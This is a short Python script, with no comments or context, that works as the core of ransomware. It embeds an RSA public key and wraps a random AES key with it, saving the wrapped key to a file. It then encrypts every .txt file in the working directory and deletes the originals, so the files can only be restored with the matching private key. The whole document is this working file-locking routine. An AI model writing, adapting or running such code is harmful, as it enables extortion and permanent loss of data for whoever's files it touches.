from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
import os


public_key = RSA.import_key(b'''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn9hAXjFvkMNEfsJAuzdR
GVQNPz6EciYB52yb5IBb9y5A8cFqsJAoV3HwQg1UGH8ZHZGq0Ohm96G2Q2gsHVTJ
Wyr67xZ1LfhkJoVpdJg32ROE2X7P8kAqWO939iid3D7LLG0KP8Qiks8mjPSl40e4
vyuWuasuakz23QJMzxKkINY/TXcigSs6xedRtP2jJ1uO+ch0c7VI8TUgJVURdsrZ
GwyJpsVeg0WVd1zdlMjmBO/qPeo0/IHk2Xmx8CTq2RVsUDtFyxveozr04FaSTjiG
lJ3QrvigWGVK4yICVyowz9WGqOBSG4XCeGzvUl2KRqw7ehmabtX2iq7thqKIww08
dwIDAQAB
-----END PUBLIC KEY-----''')


shared_key = get_random_bytes(16)


cipher = PKCS1_OAEP.new(public_key)
encrypted_shared_key = cipher.encrypt(shared_key)


with open("EncryptedSharedKey", "wb") as file:
    file.write(encrypted_shared_key)


for filename in os.listdir():
    if filename.endswith(".txt"):
        with open(filename, "rb") as file:
            data = file.read()


        cipher_aes = AES.new(shared_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)


        with open(filename + ".encrypted", "wb") as file:
            [file.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]


        os.remove(filename)


